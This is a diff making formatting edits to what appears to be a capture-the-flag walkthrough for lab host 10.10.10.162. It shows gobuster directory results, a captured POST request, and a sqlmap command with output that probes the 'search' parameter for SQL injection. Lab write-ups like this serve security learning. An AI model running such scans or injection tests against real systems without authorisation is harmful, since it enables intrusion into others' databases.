@@ -390,11 +390,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2020/04/19 01:43:01 Starting gobuster
 ===============================================================
 /home.php (Status: 302)
-/index.php (Status: 200)
-```
+/index.php (Status: 200)```
 
 ### SQL MAP Usage
-Redirect the HTTP Request to Burpsuite and we can see the request like this.
+*Redirect the HTTP Request to Burpsuite and we can see the request like this.
+
 ```POST / HTTP/1.1
 Host: 10.10.10.162
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -409,7 +409,8 @@ Upgrade-Insecure-Requests: 1
 
 search=help```
 
-Now Right click and click on `copy to file` option.
+*Now Right click and click on `copy to file` option.
+
 ```root@kali:/SqlMap# sqlmap -r search.req --batch --force-ssl
         ___
        __H__
@@ -434,4 +435,5 @@ Now Right click and click on `copy to file` option.
 [01:25:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
 [01:25:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
 [01:25:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
-[01:25:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause' ```
+[01:25:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause' 
+```
